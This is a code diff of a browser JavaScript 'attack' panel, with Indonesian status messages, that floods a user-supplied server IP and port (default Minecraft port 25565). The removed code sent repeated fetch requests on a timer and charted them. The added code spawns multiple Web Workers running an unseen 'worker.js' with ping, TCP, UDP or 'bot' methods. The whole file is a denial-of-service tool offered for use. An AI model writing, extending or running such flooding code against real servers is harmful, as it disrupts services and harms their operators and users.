@@ -1,65 +1,30 @@
-let attackInterval;
-let attackCount = 0;
-
-// Inisialisasi grafik
-const ctx = document.getElementById('attackChart').getContext('2d');
-const attackChart = new Chart(ctx, {
-    type: 'line',
-    data: {
-        labels: [],
-        datasets: [{
-            label: 'Requests Sent',
-            borderColor: 'red',
-            backgroundColor: 'rgba(255, 0, 0, 0.2)',
-            data: []
-        }]
-    },
-    options: { responsive: true }
-});
-
-function updateChart() {
-    attackChart.data.labels.push(attackCount);
-    attackChart.data.datasets[0].data.push(attackCount);
-    attackChart.update();
-}
+let workers = [];
 
 function startAttack() {
     let serverIP = document.getElementById("serverIP").value;
-    let requestCount = parseInt(document.getElementById("requestCount").value);
+    let serverPort = document.getElementById("serverPort").value || 25565;
     let attackMethod = document.getElementById("attackMethod").value;
+    let threadCount = parseInt(document.getElementById("threadCount").value) || 5;
     let statusDiv = document.getElementById("status");
 
-    if (!serverIP || requestCount <= 0) {
-        alert("Masukkan IP dan jumlah request yang valid!");
+    if (!serverIP || !serverPort || threadCount <= 0) {
+        alert("Masukkan IP, Port, dan jumlah thread yang valid!");
         return;
     }
 
-    attackCount = 0;
-    statusDiv.innerHTML = "Menyerang " + serverIP + " dengan " + attackMethod;
+    statusDiv.innerHTML = `Menyerang ${serverIP}:${serverPort} dengan ${attackMethod} menggunakan ${threadCount} thread`;
 
-    attackInterval = setInterval(() => {
-        if (attackCount >= requestCount) {
-            clearInterval(attackInterval);
-            statusDiv.innerHTML = "Serangan selesai!";
-            return;
-        }
+    stopAttack(); // Hentikan serangan sebelumnya jika ada
 
-        if (attackMethod === "ping") {
-            fetch(`http://${serverIP}:25565/ping`).catch(() => {});
-        } else if (attackMethod === "tcp") {
-            fetch(`http://${serverIP}:25565/tcp`).catch(() => {});
-        } else if (attackMethod === "udp") {
-            fetch(`http://${serverIP}:25565/udp`).catch(() => {});
-        } else if (attackMethod === "bot") {
-            fetch(`http://${serverIP}:25565/bot`).catch(() => {});
-        }
-
-        attackCount++;
-        updateChart();
-    }, 100);
+    for (let i = 0; i < threadCount; i++) {
+        let worker = new Worker("worker.js");
+        worker.postMessage({ serverIP, serverPort, attackMethod });
+        workers.push(worker);
+    }
 }
 
 function stopAttack() {
-    clearInterval(attackInterval);
+    workers.forEach(worker => worker.terminate());
+    workers = [];
     document.getElementById("status").innerHTML = "Serangan dihentikan!";
 }
